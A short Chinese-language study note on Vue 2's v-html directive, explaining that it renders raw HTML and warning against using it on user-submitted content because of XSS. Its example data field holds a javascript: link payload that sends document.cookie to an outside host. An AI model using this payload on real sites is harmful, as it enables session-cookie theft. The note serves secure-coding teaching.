---
v-ontitle: Vue v-html
date: 2022-05-22 6:00:00
updated: 2022-05-22 6:00:00
categories:
        - 前端框架
tags:
        - Vue
        - 前端
        - Vue 2
        - 学习笔记

---

# v-html

设置元素的 innerHTML，会覆盖元素中的所有内容。但与`v-text`不同的是，它会识别 HTML 元素

## 安全性

在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 `XSS` 攻击。只在可信内容上使用 `v-html`，**永不**用在用户提交的内容上。

**HTML**

```HTMl
<div id="app">
    <div v-html="msg">原内容</div>
</div>
```

**JavaScrip**

```JavaScrip
var vm = new Vue({
	el: '#app',
	data: {
		msg: '<a href=javascript:location.href="http://www.baidu.com?" + document.cookie>XXS 攻击</a> ',
	},
});

Vue.config.productionTip = false;

```

